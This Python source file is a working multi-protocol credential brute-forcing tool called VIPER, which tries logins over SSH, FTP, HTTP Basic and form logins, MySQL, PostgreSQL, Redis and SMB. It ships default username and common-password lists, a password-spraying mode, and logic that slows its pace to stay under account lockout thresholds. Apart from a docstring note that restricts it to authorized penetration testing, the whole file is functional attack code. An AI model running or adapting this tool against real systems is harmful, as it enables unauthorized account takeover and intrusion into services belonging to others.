#!/usr/bin/env python3
"""
VIPER Brute-Force Engine — Multi-protocol credential testing.

Supports SSH, FTP, HTTP Basic, HTTP Form, MySQL, PostgreSQL, Redis, and SMB.
Implements rate limiting, credential spraying, and lockout detection.

IMPORTANT: This tool is for authorized penetration testing only.
Always ensure written authorization before testing credentials.
"""

import asyncio
import base64
import logging
import time
from dataclasses import dataclass, field
from typing import Dict, List, Optional, Tuple

logger = logging.getLogger("viper.brute_forcer")


@dataclass
class Credential:
    """A discovered valid credential."""
    username: str
    password: str
    protocol: str
    host: str
    port: int
    timestamp: float = field(default_factory=time.time)

    def to_dict(self) -> Dict:
        return {
            "username": self.username,
            "password": self.password,
            "protocol": self.protocol,
            "host": self.host,
            "port": self.port,
            "timestamp": self.timestamp,
        }


@dataclass
class BruteForceResult:
    """Result of a brute-force session."""
    target: str
    protocol: str
    credentials_found: List[Credential] = field(default_factory=list)
    attempts: int = 0
    duration: float = 0.0
    stopped_reason: Optional[str] = None

    def to_dict(self) -> Dict:
        return {
            "target": self.target,
            "protocol": self.protocol,
            "credentials_found": [c.to_dict() for c in self.credentials_found],
            "attempts": self.attempts,
            "duration": round(self.duration, 2),
            "stopped_reason": self.stopped_reason,
            "success": len(self.credentials_found) > 0,
        }


class BruteForcer:
    """Multi-protocol brute-force engine with safety controls.

    Features:
      - Rate limiting (default 1 attempt/sec to avoid lockouts)
      - Credential spray mode (1 password across all users before next)
      - Lockout detection (stops on repeated failures)
      - Configurable max attempts cap
    """

    PROTOCOLS: Dict[str, Dict] = {
        "ssh": {"port": 22, "method": "_brute_ssh"},
        "ftp": {"port": 21, "method": "_brute_ftp"},
        "http_basic": {"port": 80, "method": "_brute_http_basic"},
        "http_form": {"port": 80, "method": "_brute_http_form"},
        "mysql": {"port": 3306, "method": "_brute_mysql"},
        "postgres": {"port": 5432, "method": "_brute_postgres"},
        "redis": {"port": 6379, "method": "_brute_redis"},
        "smb": {"port": 445, "method": "_brute_smb"},
    }

    DEFAULT_USERS: List[str] = [
        "admin", "root", "user", "test", "guest", "administrator",
        "operator", "manager", "support", "service", "deploy",
        "www-data", "apache", "nginx", "tomcat", "postgres",
        "mysql", "ftp", "backup", "monitor",
    ]

    DEFAULT_PASSWORDS: List[str] = [
        "admin", "password", "123456", "root", "test", "guest",
        "12345678", "123456789", "1234567890", "qwerty",
        "abc123", "password1", "admin123", "letmein", "welcome",
        "monkey", "master", "dragon", "login", "princess",
        "passw0rd", "shadow", "sunshine", "trustno1", "iloveyou",
        "batman", "football", "charlie", "access", "hello",
        "ranger", "buster", "daniel", "thomas", "robert",
        "soccer", "hockey", "killer", "george", "pepper",
        "zxcvbn", "summer", "bailey", "ashley", "michael",
        "123123", "111111", "000000", "654321", "987654321",
        "pass", "test123", "default", "changeme", "P@ssw0rd",
        "P@ssword1", "Password1", "password123", "admin1234",
        "toor", "r00t", "p@ss", "1q2w3e4r", "qwerty123",
        "secret", "server", "computer", "internet", "mysql",
        "oracle", "sysadmin", "supervisor", "demo", "temp",
        "public", "private", "enterprise", "system", "user123",
        "manager", "remote", "setup", "vpn", "ftp123",
        "web", "www", "apache", "nginx", "linux",
        "windows", "cisco", "ubnt", "alpine", "vagrant",
        "docker", "kali", "raspberry", "pi", "administrator",
        "backup", "operator", "monitor", "readonly", "dev",
        "staging", "production", "qa", "testing", "debug",
        "", "1234", "12345", "pass123", "admin@123",
    ]

    # Lockout detection thresholds
    LOCKOUT_CONSECUTIVE_FAILURES = 5
    LOCKOUT_MESSAGES = [
        "account locked", "too many attempts", "temporarily blocked",
        "rate limit", "try again later", "account disabled",
        "maximum attempts", "locked out",
    ]

    def __init__(self, rate_limit: float = 1.0, max_attempts: int = 1000,
                 spray_mode: bool = True, timeout: float = 10.0):
        """Initialize the brute-force engine.

        Args:
            rate_limit: Minimum seconds between attempts (default 1.0)
            max_attempts: Maximum total attempts before stopping
            spray_mode: If True, try 1 password across all users first
            timeout: Connection timeout in seconds per attempt
        """
        self.rate_limit = rate_limit
        self.max_attempts = max_attempts
        self.spray_mode = spray_mode
        self.timeout = timeout
        self._stop_flag = False

    def stop(self):
        """Signal the brute-forcer to stop."""
        self._stop_flag = True

    async def brute_force(self, target: str, protocol: str,
                          users: Optional[List[str]] = None,
                          passwords: Optional[List[str]] = None,
                          port: Optional[int] = None,
                          max_attempts: Optional[int] = None,
                          **kwargs) -> BruteForceResult:
        """Run a brute-force attack against a target.

        Args:
            target: Hostname or IP address
            protocol: One of the supported protocols (ssh, ftp, etc.)
            users: Username list (defaults to DEFAULT_USERS)
            passwords: Password list (defaults to DEFAULT_PASSWORDS)
            port: Override default port for the protocol
            max_attempts: Override instance max_attempts
            **kwargs: Protocol-specific arguments (e.g., form_url, form_data)

        Returns:
            BruteForceResult with any discovered credentials
        """
        self._stop_flag = False
        protocol = protocol.lower()

        if protocol not in self.PROTOCOLS:
            return BruteForceResult(
                target=target, protocol=protocol,
                stopped_reason=f"Unknown protocol: {protocol}. "
                               f"Supported: {list(self.PROTOCOLS.keys())}"
            )

        proto_info = self.PROTOCOLS[protocol]
        method_name = proto_info["method"]
        actual_port = port or proto_info["port"]
        method = getattr(self, method_name, None)

        if method is None:
            return BruteForceResult(
                target=target, protocol=protocol,
                stopped_reason=f"Method {method_name} not implemented"
            )

        user_list = users or self.DEFAULT_USERS
        pass_list = passwords or self.DEFAULT_PASSWORDS
        attempt_cap = max_attempts or self.max_attempts

        # Build credential pairs in spray or traditional order
        pairs = self._build_pairs(user_list, pass_list)

        result = BruteForceResult(target=target, protocol=protocol)
        start_time = time.time()
        consecutive_failures = 0

        logger.info("Starting %s brute-force against %s:%d (%d pairs, cap=%d)",
                     protocol, target, actual_port, len(pairs), attempt_cap)

        for username, password in pairs:
            if self._stop_flag:
                result.stopped_reason = "Manually stopped"
                break

            if result.attempts >= attempt_cap:
                result.stopped_reason = f"Max attempts reached ({attempt_cap})"
                break

            # Rate limiting
            await asyncio.sleep(self.rate_limit)

            try:
                success, message = await asyncio.wait_for(
                    method(target, actual_port, username, password, **kwargs),
                    timeout=self.timeout,
                )
                result.attempts += 1

                if success:
                    cred = Credential(
                        username=username,
                        password=password,
                        protocol=protocol,
                        host=target,
                        port=actual_port,
                    )
                    result.credentials_found.append(cred)
                    consecutive_failures = 0
                    logger.info("Valid credential found: %s:%s@%s:%d (%s)",
                                 username, "***", target, actual_port, protocol)
                else:
                    consecutive_failures += 1
                    # Check for lockout indicators
                    if message and self._detect_lockout(message):
                        result.stopped_reason = f"Lockout detected: {message}"
                        logger.warning("Lockout detected on %s: %s",
                                        target, message)
                        break

                    if consecutive_failures >= self.LOCKOUT_CONSECUTIVE_FAILURES:
                        # Brief pause to avoid triggering lockouts
                        await asyncio.sleep(self.rate_limit * 5)
                        consecutive_failures = 0

            except asyncio.TimeoutError:
                result.attempts += 1
                consecutive_failures += 1
                logger.debug("Timeout: %s@%s:%d", username, target, actual_port)
            except Exception as e:
                result.attempts += 1
                logger.debug("Error: %s@%s:%d — %s", username, target,
                              actual_port, e)

        result.duration = time.time() - start_time
        logger.info("Brute-force complete: %d attempts, %d found, %.1fs",
                     result.attempts, len(result.credentials_found),
                     result.duration)
        return result

    # -------------------------------------------------------------------
    # Credential pair ordering
    # -------------------------------------------------------------------

    def _build_pairs(self, users: List[str],
                     passwords: List[str]) -> List[Tuple[str, str]]:
        """Build ordered credential pairs.

        In spray mode: iterates passwords first (1 password across all users).
        In traditional mode: iterates users first (all passwords per user).
        """
        if self.spray_mode:
            return [(u, p) for p in passwords for u in users]
        return [(u, p) for u in users for p in passwords]

    def _detect_lockout(self, message: str) -> bool:
        """Check if an error message indicates account lockout."""
        msg_lower = message.lower()
        return any(indicator in msg_lower for indicator in self.LOCKOUT_MESSAGES)

    # -------------------------------------------------------------------
    # Protocol-specific brute-force methods
    # -------------------------------------------------------------------

    async def _brute_ssh(self, host: str, port: int,
                         username: str, password: str,
                         **kwargs) -> Tuple[bool, str]:
        """Attempt SSH login using asyncssh or subprocess fallback."""
        try:
            import asyncssh
            async with asyncssh.connect(
                host, port=port,
                username=username, password=password,
                known_hosts=None,
                login_timeout=self.timeout,
            ) as conn:
                return True, "SSH login successful"
        except ImportError:
            # Fallback to subprocess
            proc = await asyncio.create_subprocess_exec(
                "sshpass", "-p", password,
                "ssh", "-o", "StrictHostKeyChecking=no",
                "-o", f"ConnectTimeout={int(self.timeout)}",
                "-p", str(port),
                f"{username}@{host}", "echo", "ok",
                stdout=asyncio.subprocess.PIPE,
                stderr=asyncio.subprocess.PIPE,
            )
            stdout, stderr = await proc.communicate()
            if proc.returncode == 0:
                return True, "SSH login successful"
            return False, stderr.decode(errors="replace").strip()
        except Exception as e:
            return False, str(e)

    async def _brute_ftp(self, host: str, port: int,
                         username: str, password: str,
                         **kwargs) -> Tuple[bool, str]:
        """Attempt FTP login using aioftp or ftplib fallback."""
        try:
            import aioftp
            async with aioftp.Client.context(
                host, port=port,
                user=username, password=password,
            ) as client:
                return True, "FTP login successful"
        except ImportError:
            import ftplib
            loop = asyncio.get_event_loop()
            try:
                def _ftp_login():
                    ftp = ftplib.FTP()
                    ftp.connect(host, port, timeout=self.timeout)
                    ftp.login(username, password)
                    ftp.quit()
                    return True
                await loop.run_in_executor(None, _ftp_login)
                return True, "FTP login successful"
            except ftplib.error_perm as e:
                return False, str(e)
        except Exception as e:
            return False, str(e)

    async def _brute_http_basic(self, host: str, port: int,
                                username: str, password: str,
                                **kwargs) -> Tuple[bool, str]:
        """Attempt HTTP Basic authentication."""
        import aiohttp

        url = kwargs.get("url", f"http://{host}:{port}/")
        creds = base64.b64encode(
            f"{username}:{password}".encode()
        ).decode()
        headers = {"Authorization": f"Basic {creds}"}

        try:
            async with aiohttp.ClientSession() as session:
                async with session.get(
                    url, headers=headers, timeout=aiohttp.ClientTimeout(
                        total=self.timeout
                    ),
                    ssl=False,
                ) as resp:
                    if resp.status in (200, 301, 302):
                        return True, f"HTTP {resp.status}"
                    if resp.status == 401:
                        return False, "HTTP 401 Unauthorized"
                    if resp.status == 403:
                        return False, "HTTP 403 Forbidden"
                    return False, f"HTTP {resp.status}"
        except Exception as e:
            return False, str(e)

    async def _brute_http_form(self, host: str, port: int,
                               username: str, password: str,
                               **kwargs) -> Tuple[bool, str]:
        """Attempt HTTP form-based login.

        kwargs:
            form_url: URL of the login form
            username_field: Form field name for username (default: "username")
            password_field: Form field name for password (default: "password")
            success_markers: List of strings indicating successful login
            failure_markers: List of strings indicating failed login
        """
        import aiohttp

        form_url = kwargs.get("form_url", f"http://{host}:{port}/login")
        user_field = kwargs.get("username_field", "username")
        pass_field = kwargs.get("password_field", "password")
        success_markers = kwargs.get("success_markers", [
            "dashboard", "welcome", "logout", "profile",
            "my account", "logged in",
        ])
        failure_markers = kwargs.get("failure_markers", [
            "invalid", "incorrect", "failed", "wrong",
            "error", "denied", "bad credentials",
        ])

        data = {user_field: username, pass_field: password}

        try:
            async with aiohttp.ClientSession(
                cookie_jar=aiohttp.CookieJar(unsafe=True)
            ) as session:
                async with session.post(
                    form_url, data=data,
                    timeout=aiohttp.ClientTimeout(total=self.timeout),
                    ssl=False,
                    allow_redirects=True,
                ) as resp:
                    body = await resp.text()
                    body_lower = body.lower()

                    # Check failure markers first
                    for marker in failure_markers:
                        if marker in body_lower:
                            return False, f"Failure marker: {marker}"

                    # Check success markers
                    for marker in success_markers:
                        if marker in body_lower:
                            return True, f"Success marker: {marker}"

                    # Check for redirect to authenticated area
                    if resp.status in (301, 302) and resp.url:
                        final_url = str(resp.url).lower()
                        for marker in success_markers:
                            if marker in final_url:
                                return True, f"Redirect to: {resp.url}"

                    # Check for session cookie as indicator
                    cookies = session.cookie_jar.filter_cookies(form_url)
                    session_cookies = [
                        c for c in cookies
                        if any(s in c.lower() for s in [
                            "session", "token", "auth", "sid", "jwt"
                        ])
                    ]
                    if session_cookies and resp.status == 200:
                        return True, "Session cookie set"

                    return False, f"HTTP {resp.status}, no markers matched"
        except Exception as e:
            return False, str(e)

    async def _brute_mysql(self, host: str, port: int,
                           username: str, password: str,
                           **kwargs) -> Tuple[bool, str]:
        """Attempt MySQL login."""
        try:
            import aiomysql
            conn = await aiomysql.connect(
                host=host, port=port,
                user=username, password=password,
                connect_timeout=self.timeout,
            )
            conn.close()
            return True, "MySQL login successful"
        except ImportError:
            import subprocess
            proc = await asyncio.create_subprocess_exec(
                "mysql", "-h", host, "-P", str(port),
                "-u", username, f"-p{password}",
                "-e", "SELECT 1",
                stdout=asyncio.subprocess.PIPE,
                stderr=asyncio.subprocess.PIPE,
            )
            _, stderr = await proc.communicate()
            if proc.returncode == 0:
                return True, "MySQL login successful"
            return False, stderr.decode(errors="replace").strip()
        except Exception as e:
            return False, str(e)

    async def _brute_postgres(self, host: str, port: int,
                              username: str, password: str,
                              **kwargs) -> Tuple[bool, str]:
        """Attempt PostgreSQL login."""
        try:
            import asyncpg
            conn = await asyncpg.connect(
                host=host, port=port,
                user=username, password=password,
                timeout=self.timeout,
            )
            await conn.close()
            return True, "PostgreSQL login successful"
        except ImportError:
            proc = await asyncio.create_subprocess_exec(
                "psql", "-h", host, "-p", str(port),
                "-U", username, "-c", "SELECT 1",
                stdout=asyncio.subprocess.PIPE,
                stderr=asyncio.subprocess.PIPE,
                env={"PGPASSWORD": password},
            )
            _, stderr = await proc.communicate()
            if proc.returncode == 0:
                return True, "PostgreSQL login successful"
            return False, stderr.decode(errors="replace").strip()
        except Exception as e:
            return False, str(e)

    async def _brute_redis(self, host: str, port: int,
                           username: str, password: str,
                           **kwargs) -> Tuple[bool, str]:
        """Attempt Redis login (password-only, username ignored for Redis < 6)."""
        try:
            import aioredis
            redis = await aioredis.from_url(
                f"redis://{host}:{port}",
                password=password,
                socket_timeout=self.timeout,
            )
            await redis.ping()
            await redis.close()
            return True, "Redis login successful"
        except ImportError:
            # Raw socket fallback
            try:
                reader, writer = await asyncio.wait_for(
                    asyncio.open_connection(host, port),
                    timeout=self.timeout,
                )
                auth_cmd = f"AUTH {password}\r\n"
                writer.write(auth_cmd.encode())
                await writer.drain()
                response = await asyncio.wait_for(
                    reader.readline(), timeout=self.timeout
                )
                writer.close()
                resp_str = response.decode(errors="replace").strip()
                if resp_str.startswith("+OK"):
                    return True, "Redis AUTH successful"
                return False, resp_str
            except Exception as e:
                return False, str(e)
        except Exception as e:
            return False, str(e)

    async def _brute_smb(self, host: str, port: int,
                         username: str, password: str,
                         **kwargs) -> Tuple[bool, str]:
        """Attempt SMB login using smbclient subprocess."""
        try:
            proc = await asyncio.create_subprocess_exec(
                "smbclient", "-L", host,
                "-U", f"{username}%{password}",
                "-p", str(port),
                stdout=asyncio.subprocess.PIPE,
                stderr=asyncio.subprocess.PIPE,
            )
            stdout, stderr = await proc.communicate()
            if proc.returncode == 0:
                return True, "SMB login successful"
            err = stderr.decode(errors="replace").strip()
            return False, err
        except FileNotFoundError:
            return False, "smbclient not installed"
        except Exception as e:
            return False, str(e)

    def get_supported_protocols(self) -> List[str]:
        """Return list of supported protocols."""
        return list(self.PROTOCOLS.keys())

    def estimate_time(self, users: Optional[List[str]] = None,
                      passwords: Optional[List[str]] = None) -> Dict:
        """Estimate time for a brute-force run.

        Returns dict with total_pairs, estimated_seconds, and
        estimated_human_readable.
        """
        n_users = len(users) if users else len(self.DEFAULT_USERS)
        n_passwords = len(passwords) if passwords else len(self.DEFAULT_PASSWORDS)
        total = min(n_users * n_passwords, self.max_attempts)
        seconds = total * self.rate_limit

        hours = int(seconds // 3600)
        minutes = int((seconds % 3600) // 60)
        secs = int(seconds % 60)

        return {
            "total_pairs": total,
            "estimated_seconds": round(seconds, 1),
            "estimated_human_readable": f"{hours}h {minutes}m {secs}s",
        }
